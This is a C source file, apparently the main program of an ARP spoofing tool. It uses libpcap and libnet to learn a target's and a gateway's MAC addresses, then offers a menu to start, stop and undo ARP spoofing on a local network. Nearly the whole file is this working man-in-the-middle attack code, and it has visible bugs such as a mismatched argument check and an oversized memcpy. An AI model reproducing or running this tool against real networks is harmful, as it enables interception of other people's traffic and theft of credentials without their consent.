#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <libnet.h>
#include <netinet/ether.h>
#include <pthread.h>
#include "arp.hpp"

int main(int argc, char *argv[])
{

    if(argc<4)
    {
        printf("<File Name> <Source IP> <Destination IP> <GateIP> \n");
        return 1;
    }

    Call_Device(&dev);//Device Select Function.
    Pcap_init(&dev,&handle);//Pcap_Open_Live init Function.
    IntoIP(&Send,&argv[1]);//SenderIp init Function.
    IntoIP(&Rec,&argv[2]);//ReceverIp init Function.
    IntoIP(&Gate,&argv[3]);//GateIp init Function.

    IpInit(&Send,&Sender_Hex_Ip);//SenderIP -> Hex Function.
    IpInit(&Rec,&Receiver_Hex_Ip);//ReciverIP -> Hex Function.
    IpInit(&Gate,&Gate_Hex_IP);//GateIP -> Hex Function.

    Lib_init(&lib_handle,&dev);//Libnet Init Function.

    Get_Mac(&My_Mac,&lib_handle);//My Mac is Init Function.
    // printf("Mac Addres: %s \n",ether_ntoa((ether_addr *)My_Mac->ether_addr_octet));
    // printf("%x \n",Sender_Hex_Ip);
    Input_Dst_Mac(&Dst_Mac);
    Set_Ether(Buf,&Dst_Mac,&My_Mac);
    Set_Arp(Buf,&My_Mac,&Sender_Hex_Ip,&Dst_Mac,&Receiver_Hex_Ip);

    printf("\nSend Packet! \n");
    // for(int q=0;q<42;q++)
    //    printf("%x ",Buf[q]);

    while (true)
    {
        pcap_sendpacket(handle,Buf,sizeof(Buf));//Send Target Mac Get Packet.
        p = pcap_next(handle,&header);
        if (Get_Dst_Mac(p)) break;

    }
    //printf("\nDst_Mac_Address: %s\n",ether_ntoa((ether_addr *)Dst_Mac));

    memcpy(Buf+38,&Gate_Hex_IP,6);

    while (true)
    {
        pcap_sendpacket(handle,Buf,sizeof(Buf));
        p = pcap_next(handle,&header);
        if (Get_Gate_Mac(p))
            break;
    }
    // for(int q=0;q<42;q++)
    //    printf("%x ",Buf[q]);

    //printf("Gate_Mac_Address: %s\n",ether_ntoa((ether_addr *)Gate_Mac));
    system("clear");

    while (arp_set!=-1)
    {
        printf("\n1.Arp Start\n2.Arp Stop\n3.Arp Recovery\n(Insert 1 to 3, input -1 exit) : ");
        scanf("%d",&arp_set);

        if(arp_set==-1) break;

        else if(arp_set==1) //Arp Start.
        {
            if(f1==true) Start_Arp();
            else printf("\n***************Already ARP Spoof Starting..***************\n");
        }

        else if(arp_set==2)
        {
            if(f2==true) Stop_Arp();
            else printf("\n***************Already ARP Spoof Stoped or Not ARP Spoof Starting***************\n");
        }

        else if(arp_set==3)
        {
            if(f3==true) Recovery_Arp();
            else printf("\n***************First Stoped ARP Spoof or Not Recovery ARP Spoof***************\n");
        }

        else printf("\nInput 0~3");

        sleep(1);
    }

}
